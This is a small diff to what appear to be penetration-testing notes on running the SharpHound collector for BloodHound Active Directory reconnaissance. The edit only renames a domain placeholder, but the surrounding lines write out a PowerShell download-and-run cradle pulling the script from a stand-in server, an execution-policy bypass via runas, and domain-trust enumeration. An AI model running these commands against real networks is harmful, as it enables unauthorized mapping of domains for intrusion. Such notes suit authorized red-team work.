@@ -8,7 +8,7 @@
 https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
 http://<local_ip>/windows/windows_weaponize/ps/SharpHound.ps1
 ```powershell
-(new-object system.net.webclient).downloadstring('http://<server>/SharpHound.ps1') | Invoke-BloodHound -CollectionMethod All  -domain <domain>
+(new-object system.net.webclient).downloadstring('http://<server>/SharpHound.ps1') | Invoke-BloodHound -CollectionMethod All  -domain <domain_fqdn>
 ```
 
 ## collect data
@@ -16,5 +16,5 @@ http://<local_ip>/windows/windows_weaponize/ps/SharpHound.ps1
 runas /netonly /user:admin\guest "powershell.exe -exec bypass"
 nltest.exe /DOMAIN_TRUSTS
 ```powershell
-import-module sharphound.ps1; invoke-bloodhound -collectionmethod <method|DCOnly> -domain <domain>
+import-module sharphound.ps1; invoke-bloodhound -collectionmethod <method|DCOnly> -domain <domain_fqdn>
 ```
